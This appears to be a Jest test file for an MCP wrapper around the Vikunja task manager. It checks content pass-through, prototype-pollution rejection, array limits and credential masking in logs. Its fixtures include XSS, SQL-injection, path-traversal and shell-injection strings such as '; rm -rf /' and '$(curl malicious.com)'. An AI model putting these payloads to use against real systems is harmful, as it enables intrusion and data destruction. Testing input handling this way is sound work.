/**
 * Content pass-through tests
 *
 * Task/filter string content is forwarded to Vikunja unchanged. This MCP does
 * not run a content blocklist. Credential masking and filter-structure checks
 * remain separate.
 */

import {
  sanitizeString,
  validateValue,
  safeJsonStringify,
  safeJsonParse
} from '../../src/utils/validation';
import { sanitizeLogData } from '../../src/utils/security';

describe('Content pass-through (thin Vikunja wrapper)', () => {
  describe('sanitizeString forwards content', () => {
    it('passes previously-blocked strings through unchanged', () => {
      const samples = [
        '<script>alert("XSS")</script>Task Title',
        'Click here <div onclick="alert(\'XSS\')">malicious</div>',
        'javascript:alert("XSS")',
        'data:text/html,<script>alert("XSS")</script>',
        '&lt;script&gt;alert("XSS")&lt;/script&gt;',
        '<style>body { background: url("javascript:alert(\'XSS\')") }</style>',
        '<svg onload="alert(\'XSS\')"></svg>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        "'; WAITFOR DELAY '00:00:05'",
        'XP_CMDSHELL evil',
        '; rm -rf /',
        '| cat /etc/passwd',
        '`whoami`',
        '$(curl malicious.com)',
        '../../../etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '*)(&',
        '{"$gt":""}',
        '</script><script>alert("XSS")</script>',
        '<!-- malicious -->',
        'scr\u200bipt',
        'scr\\u0069pt',
        'onclick="alert(1)"',
        'backup format',
        'information',
        '[7.10] Vendor boundary: abstract the driver and backup format',
      ];

      for (const sample of samples) {
        expect(sanitizeString(sample)).toBe(sample);
      }
    });

    it('passes everyday task titles and HTML descriptions', () => {
      expect(sanitizeString('Create a migration plan')).toBe('Create a migration plan');
      expect(sanitizeString("'; DROP TABLE tasks; --")).toBe("'; DROP TABLE tasks; --");
      const html = '<div class="test">Content with & symbols</div>';
      expect(sanitizeString(html)).toBe(html);
    });

    it('rejects non-string values only', () => {
      expect(() => sanitizeString(123 as unknown as string)).toThrow('Value must be a string');
    });
  });

  describe('JSON structure checks (unchanged)', () => {
    it('stringifies normal filter expressions', () => {
      const filterExpression = {
        groups: [{
          conditions: [{ field: 'title', operator: '=', value: 'Normal task title' }],
          operator: '&&',
        }],
      };

      const result = safeJsonStringify(filterExpression);
      expect(result).toContain('Normal task title');
    });

    it('rejects malformed JSON for filter parse', () => {
      expect(() => {
        safeJsonParse('{"title": "<script>alert(1)</script>"}');
      }).toThrow();
    });

    it('prevents prototype pollution in JSON', () => {
      expect(() => {
        safeJsonParse('{"__proto__": {"isAdmin": true}}');
      }).toThrow('contains potentially dangerous prototype pollution patterns');
    });
  });

  describe('Array validation', () => {
    it('passes string arrays including markup through', () => {
      const arr = ['Task 1', '<script>alert("XSS")</script>Task 2', 'Task 3'];
      expect(validateValue(arr)).toEqual(arr);
    });

    it('rejects mixed non-numeric content in numeric arrays', () => {
      expect(() => {
        validateValue([1, 2, '; DROP TABLE users; --', 4]);
      }).toThrow();
    });

    it('limits array size to prevent DoS', () => {
      const largeArray = new Array(101).fill('test');
      expect(() => {
        validateValue(largeArray);
      }).toThrow('cannot exceed 100 elements');
    });
  });

  describe('Log credential masking (content not blocked)', () => {
    it('masks credentials but passes title content through', () => {
      const mixedContent = {
        title: '<script>alert("XSS")</script>Task',
        api_token: 'sk-secret123456789'
      };

      expect(sanitizeLogData(mixedContent)).toEqual({
        title: '<script>alert("XSS")</script>Task',
        api_token: '[REDACTED]'
      });
    });

    it('masks secrets in nested objects without rewriting other strings', () => {
      const nestedMalicious = {
        task: {
          title: '<img src=x onerror=alert(1)>',
          metadata: {
            description: 'Normal text',
            tags: ['<script>alert(1)</script>', 'normal']
          }
        },
        secret: 'credential123456789'
      };

      expect(sanitizeLogData(nestedMalicious)).toEqual({
        task: {
          title: '<img src=x onerror=alert(1)>',
          metadata: {
            description: 'Normal text',
            tags: ['<script>alert(1)</script>', 'normal']
          }
        },
        secret: '[REDACTED]'
      });
    });
  });
});
